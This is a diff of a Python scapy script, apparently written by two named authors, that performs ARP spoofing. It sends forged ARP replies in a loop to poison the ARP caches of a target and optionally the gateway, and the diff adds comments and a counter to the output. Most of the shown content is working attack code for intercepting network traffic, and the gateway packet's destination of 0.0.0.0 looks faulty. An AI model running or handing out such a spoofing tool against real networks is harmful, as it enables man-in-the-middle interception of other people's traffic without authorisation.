@@ -1,3 +1,4 @@
+# Maor Frost AND Asaf Yahav
 import scapy
 import argparse
 import time
@@ -22,7 +23,7 @@ if args.verbose: # print arguments
     print(args)
 
 DELAY = float(args.DELAY)
-if args.IFACE:
+if args.IFACE: # if the user chose his owm interface
     IFACE = args.IFACE
 our_mac=get_if_hwaddr(IFACE) # mac address of this interface
 
@@ -43,23 +44,26 @@ arp_reply = ARP(
 # # packet for gateway
 arp_gw = ARP(
 	op=2,  # 2 = is-at (ARP reply)
-	psrc=TARGET,  # IP we claiming to be (e.g., gateway)
+	psrc=TARGET,  # IP we are claiming to be (e.g., gateway)
 	pdst="0.0.0.0",  # gateway IP
-	hwsrc=our_mac,  # ip is-at MAC
+	hwsrc=our_mac,  # ip is-at our MAC
 )
 if args.verbose: # print packets
     arp_reply.show()
     if args.gateway:
         arp_gw.show()
 
+# sendind the ARP replys
+i=0
 sending = True
 while sending:
     try:
         send(arp_reply, verbose=0)
-        print("Sent ARP table to {}".format(TARGET))
+        print("{} Sent ARP table to {}".format(i, TARGET))
         if args.gateway:
             send(arp_gw, verbose=0)
-            print("Sent ARP table to gateway")
+            print("{} Sent ARP table to gateway".format(i))
+        i+=1
         time.sleep(DELAY)
     except KeyboardInterrupt:
         sending = False
